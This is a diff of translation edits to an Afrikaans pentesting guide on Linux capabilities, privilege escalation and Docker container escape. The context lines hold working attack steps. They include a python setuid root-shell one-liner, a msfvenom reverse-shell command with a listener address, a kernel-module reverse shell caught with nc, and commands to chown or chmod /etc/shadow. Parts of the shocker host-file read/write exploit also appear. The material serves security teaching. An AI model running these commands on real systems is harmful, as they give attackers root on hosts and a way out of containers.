@@ -15,13 +15,13 @@ Linux vermoëns verdeel **root bevoegdhede in kleiner, afsonderlike eenhede**, w
 
 1. **Geërfde (CapInh)**:
 
-- **Doel**: Bepaal die vermoëns wat van die ouerproses oorgedra word.
+- **Doel**: Bepaal die vermoëns wat van die ouer proses oorgedra word.
 - **Funksionaliteit**: Wanneer 'n nuwe proses geskep word, erf dit die vermoëns van sy ouer in hierdie stel. Nuttig om sekere bevoegdhede oor proses ontstaan te handhaaf.
 - **Beperkings**: 'n Proses kan nie vermoëns verkry wat sy ouer nie besit het nie.
 
 2. **Effektief (CapEff)**:
 
-- **Doel**: Verteenwoordig die werklike vermoëns wat 'n proses op enige oomblik gebruik.
+- **Doel**: Verteenwoordig die werklike vermoëns wat 'n proses op enige oomblik benut.
 - **Funksionaliteit**: Dit is die stel vermoëns wat deur die kernel nagegaan word om toestemming vir verskeie operasies te verleen. Vir lêers kan hierdie stel 'n vlag wees wat aandui of die lêer se toegelate vermoëns as effektief beskou moet word.
 - **Belangrikheid**: Die effektiewe stel is van kardinale belang vir onmiddellike bevoegdheidstoetsing, wat as die aktiewe stel van vermoëns dien wat 'n proses kan gebruik.
 
@@ -35,7 +35,7 @@ Linux vermoëns verdeel **root bevoegdhede in kleiner, afsonderlike eenhede**, w
 
 - **Doel**: Plaas 'n plafon op die vermoëns wat 'n proses ooit kan verkry gedurende sy lewensiklus.
 - **Funksionaliteit**: Selfs al het 'n proses 'n sekere vermoë in sy geërfde of toegelate stel, kan dit nie daardie vermoë verkry nie tensy dit ook in die beperkende stel is.
-- **Gebruiksgval**: Hierdie stel is veral nuttig om 'n proses se bevoegdheidseskalering potensiaal te beperk, wat 'n ekstra laag van sekuriteit toevoeg.
+- **Gebruiksgval**: Hierdie stel is veral nuttig om 'n proses se bevoegdheidstoename potensiaal te beperk, wat 'n ekstra laag van sekuriteit toevoeg.
 
 5. **Omgewings (CapAmb)**:
 - **Doel**: Laat sekere vermoëns toe om oor 'n `execve` stelselsoproep gehandhaaf te word, wat tipies 'n volle reset van die proses se vermoëns sou veroorsaak.
@@ -64,7 +64,7 @@ Let daarop dat vir alle lopende prosesse vermoënsinligting per draad gehandhaaf
 
 Jy kan die vermoëns wat in /usr/include/linux/capability.h gedefinieer is, vind.
 
-Jy kan die vermoëns van die huidige proses in `cat /proc/self/status` of deur `capsh --print` te doen, en van ander gebruikers in `/proc/<pid>/status` vind.
+Jy kan die vermoëns van die huidige proses vind in `cat /proc/self/status` of deur `capsh --print` te doen en van ander gebruikers in `/proc/<pid>/status`
 ```bash
 cat /proc/1234/status | grep Cap
 cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
@@ -123,7 +123,7 @@ CapAmb:    0000000000000000
 $ capsh --decode=0000000000003000
 0x0000000000003000=cap_net_admin,cap_net_raw
 ```
-Soos wat jy kan sien, stem die gegewe vermoëns ooreen met die resultate van die 2 maniere om die vermoëns van 'n binêre te verkry.\
+Soos jy kan sien, stem die gegewe vermoëns ooreen met die resultate van die 2 maniere om die vermoëns van 'n binêre te verkry.\
 Die _getpcaps_ hulpmiddel gebruik die **capget()** stelselskakel om die beskikbare vermoëns vir 'n spesifieke draad te vra. Hierdie stelselskakel benodig slegs die PID om meer inligting te verkry.
 
 ### Binêre Vermoëns
@@ -175,7 +175,7 @@ cap_sys_admin,22,25          jrsysadmin
 ```
 ## Omgewing Vermoëns
 
-Deur die volgende program te kompileer, is dit moontlik om **'n bash-skal te genereer binne 'n omgewing wat vermoëns bied**.
+Deur die volgende program te kompileer, is dit moontlik om **'n bash-skaal binne 'n omgewing wat vermoëns bied** te **spawn**.
 ```c:ambient.c
 /*
 * Test program for the ambient capabilities
@@ -271,21 +271,21 @@ gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 ./ambient /bin/bash
 ```
-Binne die **bash wat deur die gecompileerde omgewing binêre uitgevoer word** is dit moontlik om die **nuwe vermoëns** waar te neem (n 'n gewone gebruiker sal geen vermoë in die "huidige" afdeling hê nie).
+Binne die **bash wat deur die gecompileerde omgewing-binary uitgevoer word** is dit moontlik om die **nuwe vermoëns** waar te neem (n 'n gewone gebruiker sal geen vermoë in die "huidige" afdeling hê).
 ```bash
 capsh --print
 Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
 ```
 > [!CAUTION]
-> Jy kan **slegs vermoëns byvoeg wat teenwoordig is** in beide die toegelate en die oorerflike stelle.
+> Jy kan **slegs vermoëns byvoeg wat teenwoordig is** in beide die toegelate en die erfbare stelle.
 
 ### Vermoë-bewuste/Vermoë-dom binaries
 
 Die **vermoë-bewuste binaries sal nie die nuwe vermoëns gebruik nie** wat deur die omgewing gegee word, maar die **vermoë-dom binaries sal dit gebruik** aangesien hulle dit nie sal verwerp nie. Dit maak vermoë-dom binaries kwesbaar binne 'n spesiale omgewing wat vermoëns aan binaries toeken.
 
-## Diensvermoëns
+## Diens Vermoëns
 
-Standaard sal 'n **diens wat as root loop al die vermoëns toegeken hê**, en in sommige gevalle kan dit gevaarlik wees.\
+Standaard sal 'n **diens wat as root loop alle vermoëns toegeken hê**, en in sommige gevalle kan dit gevaarlik wees.\
 Daarom laat 'n **dienskonfigurasie** lêer jou toe om die **vermoëns** wat jy wil hê dit moet hê, **en** die **gebruiker** wat die diens moet uitvoer, te **specifiseer** om te verhoed dat 'n diens met onnodige voorregte gedraai word:
 ```bash
 [Service]
@@ -294,7 +294,7 @@ AmbientCapabilities=CAP_NET_BIND_SERVICE
 ```
 ## Vermoëns in Docker Houers
 
-Standaard ken Docker 'n paar vermoëns aan die houers toe. Dit is baie maklik om te kyk watter vermoëns dit is deur die volgende opdrag te loop:
+Standaard ken Docker 'n paar vermoëns aan die houers toe. Dit is baie maklik om te kyk watter vermoëns dit is deur die volgende opdrag uit te voer:
 ```bash
 docker run --rm -it  r.j3ss.co/amicontained bash
 Capabilities:
@@ -311,9 +311,9 @@ docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained 
 ```
 ## Privesc/Container Escape
 
-Vermogens is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte operasies uitgevoer het** (bv. nadat jy chroot opgestel het en aan 'n sokkie gebind het). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente oor te dra wat dan as root uitgevoer word.
+Vermoe is nuttig wanneer jy **jou eie prosesse wil beperk nadat jy bevoorregte operasies uitgevoer het** (bv. nadat jy chroot opgestel het en aan 'n sokkie gebind het). Dit kan egter uitgebuit word deur kwaadwillige opdragte of argumente oor te dra wat dan as root uitgevoer word.
 
-Jy kan vermogens op programme afdwing met `setcap`, en dit navraag met `getcap`:
+Jy kan vermoe op programme afdwing met `setcap`, en dit navraag met `getcap`:
 ```bash
 #Set Capability
 setcap cap_net_raw+ep /sbin/ping
@@ -338,7 +338,7 @@ setcap cap_setuid+ep /usr/bin/python2.7
 #Exploit
 /usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
 ```
-**Vermoe** wat nodig is deur `tcpdump` om **enige gebruiker toe te laat om pakkette te snuffel**:
+**Vermoe** wat benodig word deur `tcpdump` om **enige gebruiker toe te laat om pakkette te snuffel**:
 ```bash
 setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
 getcap /usr/sbin/tcpdump
@@ -417,8 +417,8 @@ chroot ./ bash #You have a shell inside the docker hosts disk
 ```
 - **Volle toegang**
 
-In die vorige metode het ons daarin geslaag om toegang te verkry tot die docker gasheer se skyf.\
-As jy vind dat die gasheer 'n **ssh** bediener draai, kan jy **n gebruiker binne die docker gasheer** se skyf skep en dit via SSH benader:
+In die vorige metode het ons daarin geslaag om toegang tot die docker gasheer skyf te verkry.\
+As jy vind dat die gasheer 'n **ssh** bediener draai, kan jy **n gebruiker binne die docker gasheer** skyf skep en dit via SSH benader:
 ```bash
 #Like in the example before, the first step is to mount the docker host disk
 fdisk -l
@@ -434,9 +434,9 @@ ssh john@172.17.0.1 -p 2222
 ```
 ## CAP_SYS_PTRACE
 
-**Dit beteken dat jy die houer kan ontsnap deur 'n shellcode binne 'n proses wat binne die gasheer loop, in te spuit.** Om toegang te verkry tot prosesse wat binne die gasheer loop, moet die houer ten minste met **`--pid=host`** gedraai word.
+**Dit beteken dat jy die houer kan ontsnap deur 'n shellcode in 'n proses wat binne die gasheer loop, in te spuit.** Om toegang te verkry tot prosesse wat binne die gasheer loop, moet die houer ten minste met **`--pid=host`** gedraai word.
 
-**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om foutopsporing en stelselaanroep-tracing funksies te gebruik wat deur `ptrace(2)` en kruis-geheue aanhegsels soos `process_vm_readv(2)` en `process_vm_writev(2)` verskaf word. Alhoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit, indien `CAP_SYS_PTRACE` geaktiveer word sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`, die stelselsekuriteit aansienlik ondermyn. Spesifiek kan dit benut word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [bewyse van konsep (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).
+**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** verleen die vermoë om foutopsporing en stelselaanroep-tracing funksies te gebruik wat deur `ptrace(2)` en kruis-geheue aanroep soos `process_vm_readv(2)` en `process_vm_writev(2)` verskaf word. Alhoewel dit kragtig is vir diagnostiese en moniteringsdoeleindes, kan dit, indien `CAP_SYS_PTRACE` geaktiveer word sonder beperkende maatreëls soos 'n seccomp-filter op `ptrace(2)`, die stelselsekuriteit aansienlik ondermyn. Spesifiek kan dit uitgebuit word om ander sekuriteitsbeperkings te omseil, veral dié wat deur seccomp opgelê word, soos gedemonstreer deur [bewyse van konsep (PoC) soos hierdie een](https://gist.github.com/thejh/8346f47e359adecd1d53).
 
 **Voorbeeld met binêre (python)**
 ```bash
@@ -536,9 +536,7 @@ libc.ptrace(PTRACE_DETACH, pid, None, None)
 ```
 /usr/bin/gdb = cap_sys_ptrace+ep
 ```
-```markdown
 Skep 'n shellcode met msfvenom om in geheue te inspuit via gdb
-```
 ```python
 # msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
 buf =  b""
@@ -601,7 +599,7 @@ U sal nie die uitvoer van die uitgevoerde opdrag kan sien nie, maar dit sal deur
 
 **Voorbeeld met omgewing (Docker breakout) - Shellcode Injeksie**
 
-U kan die geaktiveerde vermoëns binne die docker houer nagaan met:
+U kan die geaktiveerde vermoëns binne die docker-container nagaan met:
 ```bash
 capsh --print
 Current: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_sys_ptrace,cap_mknod,cap_audit_write,cap_setfcap+ep
@@ -624,7 +622,7 @@ Lys **prosesse** wat in die **gasheer** loop `ps -eaf`
 
 ## CAP_SYS_MODULE
 
-**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bemagtig 'n proses om **kernmodules te laai en te verwyder (`init_module(2)`, `finit_module(2)` en `delete_module(2)` stelsels oproepe)**, wat direkte toegang tot die kern se kernoperasies bied. Hierdie vermoë bied kritieke sekuriteitsrisiko's, aangesien dit privaatheidsverhoging en totale stelselskompromie moontlik maak deur wysigings aan die kern toe te laat, wat alle Linux-sekuriteitsmeganismes, insluitend Linux Security Modules en houer-isolasie, omseil.
+**[`CAP_SYS_MODULE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** bemagtig 'n proses om **kernmodules te laai en te verwyder (`init_module(2)`, `finit_module(2)` en `delete_module(2)` stelsels oproepe)**, wat direkte toegang tot die kern se kernbedrywighede bied. Hierdie vermoë bied kritieke sekuriteitsrisiko's, aangesien dit privaatheidsverhoging en totale stelselskompromie moontlik maak deur wysigings aan die kern toe te laat, wat alle Linux-sekuriteitsmeganismes, insluitend Linux Security Modules en houer-isolasie, omseil.
 **Dit beteken dat jy kan** **kernmodules in/uit die kern van die gasheer masjien invoeg/verwyder.**
 
 **Voorbeeld met binêre**
@@ -634,8 +632,8 @@ In die volgende voorbeeld het die binêre **`python`** hierdie vermoë.
 getcap -r / 2>/dev/null
 /usr/bin/python2.7 = cap_sys_module+ep
 ```
-Standaard, **`modprobe`** opdrag kyk vir afhanklikheidslys en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
-Om hiervan misbruik te maak, kom ons skep 'n vals **lib/modules** gids:
+Standaard kontroleer die **`modprobe`** opdrag vir afhanklikheidslys en kaartlêers in die gids **`/lib/modules/$(uname -r)`**.\
+Om hiervan misbruik te maak, laat ons 'n vals **lib/modules** gids skep:
 ```bash
 mkdir lib/modules -p
 cp -a /lib/modules/5.0.0-20-generic/ lib/modules/$(uname -r)
@@ -677,7 +675,7 @@ groups=0(root)
 ```
 Binne die vorige uitset kan jy sien dat die **SYS_MODULE** vermoë geaktiveer is.
 
-**Skep** die **kernel module** wat 'n omgekeerde skulp gaan uitvoer en die **Makefile** om dit te **kompiler**:
+**Skep** die **kernmodul** wat 'n omgekeerde skulp gaan uitvoer en die **Makefile** om dit te **kompiler**:
 ```c:reverse-shell.c
 #include <linux/kmod.h>
 #include <linux/module.h>
@@ -712,7 +710,7 @@ clean:
 make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
 ```
 > [!WARNING]
-> Die leë karakter voor elke maak woord in die Makefile **moet 'n tab wees, nie spasies nie**!
+> Die leë karakter voor elke make woord in die Makefile **moet 'n tab wees, nie spasies nie**!
 
 Voer `make` uit om dit te kompileer.
 ```
@@ -721,7 +719,7 @@ ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  S
 sudo apt update
 sudo apt full-upgrade
 ```
-Laastens, begin `nc` binne 'n skulp en **laai die module** vanaf 'n ander een en jy sal die skulp in die nc proses vang:
+Laastens, begin `nc` binne 'n shell en **laai die module** vanaf 'n ander een en jy sal die shell in die nc proses vang:
 ```bash
 #Shell 1
 nc -lvnp 4444
@@ -729,13 +727,13 @@ nc -lvnp 4444
 #Shell 2
 insmod reverse-shell.ko #Launch the reverse shell
 ```
-**Die kode van hierdie tegniek is gekopieer uit die laboratorium van "Abusing SYS_MODULE Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
+**Die kode van hierdie tegniek is gekopieer van die laboratorium van "Abusing SYS_MODULE Capability" van** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)
 
 'n Ander voorbeeld van hierdie tegniek kan gevind word in [https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host)
 
 ## CAP_DAC_READ_SEARCH
 
-[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel 'n proses in staat om **toestemmings vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Die primêre gebruik daarvan is vir lêer soek of leesdoeleindes. Dit stel egter ook 'n proses in staat om die `open_by_handle_at(2)` funksie te gebruik, wat enige lêer kan benader, insluitend dié buite die proses se monteernaamruimte. Die handvatsel wat in `open_by_handle_at(2)` gebruik word, behoort 'n nie-deursigtige identifiseerder te wees wat verkry is deur `name_to_handle_at(2)`, maar dit kan sensitiewe inligting insluit soos inode-nommers wat kwesbaar is vir manipulasie. Die potensiaal vir die uitbuiting van hierdie vermoë, veral in die konteks van Docker-konteiners, is deur Sebastian Krahmer met die shocker exploit gedemonstreer, soos geanaliseer [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
+[**CAP_DAC_READ_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel 'n proses in staat om **toestemmings vir die lees van lêers en vir die lees en uitvoer van gidse te omseil**. Die primêre gebruik daarvan is vir lêer soek of lees doeleindes. Dit stel egter ook 'n proses in staat om die `open_by_handle_at(2)` funksie te gebruik, wat enige lêer kan benader, insluitend dié buite die proses se monteer naamruimte. Die handvatsel wat in `open_by_handle_at(2)` gebruik word, behoort 'n nie-deursigtige identifiseerder te wees wat verkry is deur `name_to_handle_at(2)`, maar dit kan sensitiewe inligting insluit soos inode nommers wat kwesbaar is vir manipulasie. Die potensiaal vir die uitbuiting van hierdie vermoë, veral in die konteks van Docker houers, is deur Sebastian Krahmer met die shocker exploit gedemonstreer, soos geanaliseer [hier](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3).
 **Dit beteken dat jy kan** **toestemmings vir lêer lees en gidse lees/uitvoer kan omseil.**
 
 **Voorbeeld met binêre**
@@ -775,9 +773,9 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Binne die vorige uitset kan jy sien dat die **DAC_READ_SEARCH** vermoë geaktiveer is. As gevolg hiervan kan die houer **prosesse ontfout**.
+Binne die vorige uitset kan jy sien dat die **DAC_READ_SEARCH** vermoë geaktiveer is. As gevolg hiervan kan die houer **prosesse debugeer**.
 
-Jy kan leer hoe die volgende uitbuiting werk in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3), maar in samevatting **CAP_DAC_READ_SEARCH** laat ons nie net toe om die lêerstelsel te traverseer sonder toestemmingstoetsing nie, maar verwyder ook eksplisiet enige toetse vir _**open_by_handle_at(2)**_ en **kan ons proses toelaat om sensitiewe lêers wat deur ander prosesse geopen is, te benader**.
+Jy kan leer hoe die volgende uitbuiting werk in [https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3) maar in samevatting **CAP_DAC_READ_SEARCH** laat ons nie net toe om die lêerstelsel te traverseer sonder toestemmingstoetsing nie, maar verwyder ook eksplisiet enige toetse vir _**open_by_handle_at(2)**_ en **kan ons proses toelaat om sensitiewe lêers wat deur ander prosesse geopen is, te benader**.
 
 Die oorspronklike uitbuiting wat hierdie toestemmings misbruik om lêers van die gasheer te lees, kan hier gevind word: [http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c), die volgende is 'n **gewysigde weergawe wat jou toelaat om die lêer wat jy wil lees as eerste argument aan te dui en dit in 'n lêer te dump.**
 ```c
@@ -930,7 +928,7 @@ return 0;
 }
 ```
 > [!WARNING]
-> Die exploit moet 'n wysiger vind na iets wat op die gasheer gemonteer is. Die oorspronklike exploit het die lêer /.dockerinit gebruik en hierdie gemodifiseerde weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk 'n ander lêer stel. Om 'n lêer te vind wat op die gasheer gemonteer is, voer net die mount-opdrag uit:
+> Die exploit moet 'n pointer vind na iets wat op die gasheer gemonteer is. Die oorspronklike exploit het die lêer /.dockerinit gebruik en hierdie gemodifiseerde weergawe gebruik /etc/hostname. As die exploit nie werk nie, moet jy dalk 'n ander lêer stel. Om 'n lêer te vind wat op die gasheer gemonteer is, voer net die mount-opdrag uit:
 
 ![](<../../images/image (407) (1).png>)
 
@@ -974,8 +972,8 @@ uid=0(root)
 gid=0(root)
 groups=0(root)
 ```
-Eerstens, lees die vorige afdeling wat [**misbruik maak van die DAC_READ_SEARCH vermoë om arbitrêre lêers te lees**](linux-capabilities.md#cap_dac_read_search) van die gasheer en **kompyleer** die ontploffing.\
-Dan, **kompyleer die volgende weergawe van die shocker ontploffing** wat jou sal toelaat om **arbitrêre lêers** binne die gasheer se lêerstelsel te **skryf**:
+Eerstens lees die vorige afdeling wat [**misbruik maak van die DAC_READ_SEARCH vermoë om arbitrêre lêers te lees**](linux-capabilities.md#cap_dac_read_search) van die gasheer en **kompiler** die eksploit.\
+Dan, **kompiler die volgende weergawe van die shocker eksploit** wat jou sal toelaat om **arbitrêre lêers** binne die gasheer se lêerstelsel te **skryf**:
 ```c
 #include <stdio.h>
 #include <sys/types.h>
@@ -1124,7 +1122,7 @@ Om die docker-container te ontsnap, kan jy die lêers `/etc/shadow` en `/etc/pas
 
 **Voorbeeld met binêre**
 
-Kom ons neem aan die **`python`** binêre het hierdie vermoë, jy kan die **eienaar** van die **shadow** lêer **verander**, die root wagwoord **verander**, en voorregte verhoog:
+Kom ons neem aan die **`python`** binêre het hierdie vermoë, jy kan die **eienaar** van die **shadow** lêer **verander**, die wortel wagwoord **verander**, en bevoegdhede verhoog:
 ```bash
 python -c 'import os;os.chown("/etc/shadow",1000,1000)'
 ```
@@ -1138,7 +1136,7 @@ ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
 
 **Voorbeeld met binêre**
 
-As python hierdie vermoë het, kan jy die toestemmings van die skadu-lêer verander, **verander die wortel wagwoord**, en bevoegdhede verhoog:
+As python hierdie vermoë het, kan jy die toestemmings van die skadu-lêer verander, **verander die root wagwoord**, en bevoegdhede verhoog:
 ```bash
 python -c 'import os;os.chmod("/etc/shadow",0666)
 ```
@@ -1186,7 +1184,7 @@ import os
 os.setgid(42)
 os.system("/bin/bash")
 ```
-In hierdie geval is die groep shadow nagebootst sodat jy die lêer `/etc/shadow` kan lees:
+In hierdie geval is die groep shadow geïmpliseer sodat jy die lêer `/etc/shadow` kan lees:
 ```bash
 cat /etc/shadow
 ```
@@ -1226,7 +1224,7 @@ print (cap + " was successfully added to " + path)
 python setcapability.py /usr/bin/python2.7
 ```
 > [!WARNING]
-> Let daarop dat as jy 'n nuwe vermoë aan die binêre met CAP_SETFCAP stel, jy hierdie vermoë sal verloor.
+> Let daarop dat as jy 'n nuwe vermoë aan die binêre met CAP_SETFCAP toeken, jy hierdie vermoë sal verloor.
 
 Sodra jy [SETUID vermoë](linux-capabilities.md#cap_setuid) het, kan jy na sy afdeling gaan om te sien hoe om voorregte te verhoog.
 
@@ -1245,7 +1243,7 @@ capsh --decode=00000000a80425fb
 0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
 ```
 Hierdie vermoë laat toe om **enige ander vermoë aan binaire** te gee, so ons kan dink aan **ontsnapping** uit die houer **deur enige van die ander vermoë breekpunte** wat op hierdie bladsy genoem word.\
-However, if you try to give for example the capabilities CAP_SYS_ADMIN and CAP_SYS_PTRACE to the gdb binary, you will find that you can give them, but the **binary won’t be able to execute after this**:
+As jy egter probeer om byvoorbeeld die vermoë CAP_SYS_ADMIN en CAP_SYS_PTRACE aan die gdb-binary te gee, sal jy vind dat jy dit kan gee, maar die **binary sal nie na dit kan uitvoer nie**:
 ```bash
 getcap /usr/bin/gdb
 /usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip
@@ -1259,7 +1257,7 @@ bash: /usr/bin/gdb: Operation not permitted
 Dit lyk of die Toegelate vermoëns diegene beperk wat gebruik kan word.\
 Egter, Docker verleen ook die **CAP_SETPCAP** standaard, so jy mag dalk in staat wees om **nuwe vermoëns binne die oorerflikes te stel**.\
 Egter, in die dokumentasie van hierdie cap: _CAP_SETPCAP : \[…] **voeg enige vermoë uit die oproepdraad se begrensde** stel by sy oorerflike stel_.\
-Dit lyk of ons slegs kan byvoeg tot die oorerflike stel vermoëns uit die begrensde stel. Dit beteken dat **ons nie nuwe vermoëns soos CAP_SYS_ADMIN of CAP_SYS_PTRACE in die oorerflike stel kan plaas om voorregte te verhoog** nie.
+Dit lyk of ons slegs kan byvoeg tot die oorerflike stel vermoëns uit die begrensde stel. Dit beteken dat **ons nie nuwe vermoëns soos CAP_SYS_ADMIN of CAP_SYS_PTRACE in die oorerflike stel kan plaas om voorregte te verhoog**.
 
 ## CAP_SYS_RAWIO
 
@@ -1292,14 +1290,13 @@ kill -s SIGUSR1 <nodejs-ps>
 electron-cef-chromium-debugger-abuse.md
 {{#endref}}
 
-
 ## CAP_NET_BIND_SERVICE
 
-**Dit beteken dat dit moontlik is om op enige poort te luister (selfs op bevoorregte poorte).** Jy kan nie regstreeks met hierdie vermoë bevoorregtinge opgradeer nie.
+**Dit beteken dat dit moontlik is om op enige poort te luister (selfs op bevoorregte poorte).** Jy kan nie regstreekse voorregte verhoog met hierdie vermoë nie.
 
 **Voorbeeld met binêre**
 
-As **`python`** hierdie vermoë het, sal dit in staat wees om op enige poort te luister en selfs van daar af met enige ander poort te verbind (sommige dienste vereis verbindings vanaf spesifieke bevoorregte poorte)
+As **`python`** hierdie vermoë het, sal dit in staat wees om op enige poort te luister en selfs van daar na enige ander poort te verbind (sommige dienste vereis verbindings vanaf spesifieke bevoorregte poorte)
 
 {{#tabs}}
 {{#tab name="Listen"}}
@@ -1327,7 +1324,7 @@ s.connect(('10.10.10.10',500))
 
 ## CAP_NET_RAW
 
-[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) vermoë laat prosesse toe om **RAW en PACKET sokke** te skep, wat hulle in staat stel om arbitrêre netwerkpakkette te genereer en te stuur. Dit kan lei tot sekuriteitsrisiko's in gekapselde omgewings, soos pakkie spoofing, verkeer inspuiting, en om netwerktoegangbeheer te omseil. Kwaadwillige akteurs kan dit benut om met kapselroutering te meng of gasheer netwerksekuriteit te benadeel, veral sonder voldoende firewall beskerming. Boonop is **CAP_NET_RAW** van kardinale belang vir bevoorregte kapsels om operasies soos ping via RAW ICMP versoeke te ondersteun.
+[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) vermoë laat prosesse toe om **RAW en PACKET sokke** te skep, wat hulle in staat stel om arbitrêre netwerkpakkette te genereer en te stuur. Dit kan lei tot sekuriteitsrisiko's in gecontaineriseerde omgewings, soos pakkie spoofing, verkeer inspuiting, en om netwerktoegangbeheer te omseil. Kwaadwillige akteurs kan dit benut om met containerroutering te meng of gasheer netwerksekuriteit te kompromitteer, veral sonder voldoende firewall beskerming. Boonop is **CAP_NET_RAW** van kardinale belang vir bevoorregte houers om operasies soos ping via RAW ICMP versoeke te ondersteun.
 
 **Dit beteken dat dit moontlik is om verkeer te snuffel.** Jy kan nie regstreeks voorregte verhoog met hierdie vermoë nie.
 
@@ -1443,24 +1440,24 @@ f.write('New content for the file\n')
 
 ## CAP_SYS_CHROOT
 
-[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel die uitvoering van die `chroot(2)` stelselskakel in staat, wat potensieel kan toelaat dat daar ontsnap word uit `chroot(2)` omgewings deur bekende kwesbaarhede:
+[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel die uitvoering van die `chroot(2)` stelselskakel in, wat potensieel die ontsnapping uit `chroot(2)` omgewings deur bekende kwesbaarhede kan toelaat:
 
 - [Hoe om uit verskeie chroot-oplossings te breek](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
 - [chw00t: chroot ontsnappingsinstrument](https://github.com/earthquake/chw00t/)
 
 ## CAP_SYS_BOOT
 
-[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel nie net die uitvoering van die `reboot(2)` stelselskakel vir stelsels herlaai in staat nie, insluitend spesifieke opdragte soos `LINUX_REBOOT_CMD_RESTART2` wat vir sekere hardeware platforms aangepas is, maar dit stel ook die gebruik van `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` in staat om nuwe of geskrewe crash-kernels te laai.
+[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) stel nie net die uitvoering van die `reboot(2)` stelselskakel vir stelsels herlaai in nie, insluitend spesifieke opdragte soos `LINUX_REBOOT_CMD_RESTART2` wat vir sekere hardeware platforms aangepas is, maar dit stel ook die gebruik van `kexec_load(2)` en, vanaf Linux 3.17, `kexec_file_load(2)` in vir die laai van nuwe of geskrewe crash-kernels onderskeidelik.
 
 ## CAP_SYSLOG
 
-[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is geskei van die breër **CAP_SYS_ADMIN** in Linux 2.6.37, wat spesifiek die vermoë verleen om die `syslog(2)` oproep te gebruik. Hierdie vermoë stel die sien van kernadresse via `/proc` en soortgelyke interfaces in staat wanneer die `kptr_restrict` instelling op 1 is, wat die blootstelling van kernadresse beheer. Sedert Linux 2.6.39 is die standaard vir `kptr_restrict` 0, wat beteken dat kernadresse blootgestel word, hoewel baie verspreidings dit op 1 (versteek adresse behalwe van uid 0) of 2 (altyd adresse versteek) vir sekuriteitsredes stel.
+[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) is in Linux 2.6.37 van die breër **CAP_SYS_ADMIN** geskei, wat spesifiek die vermoë verleen om die `syslog(2)` oproep te gebruik. Hierdie vermoë stel die sien van kernadresse via `/proc` en soortgelyke interfaces toe wanneer die `kptr_restrict` instelling op 1 is, wat die blootstelling van kernadresse beheer. Sedert Linux 2.6.39 is die standaard vir `kptr_restrict` 0, wat beteken dat kernadresse blootgestel word, hoewel baie verspreidings dit op 1 (versteek adresse behalwe van uid 0) of 2 (altyd adresse versteek) vir sekuriteitsredes stel.
 
 Boonop stel **CAP_SYSLOG** toegang tot `dmesg` uitvoer toe wanneer `dmesg_restrict` op 1 gestel is. Ten spyte van hierdie veranderinge, behou **CAP_SYS_ADMIN** die vermoë om `syslog` operasies uit te voer weens historiese precedente.
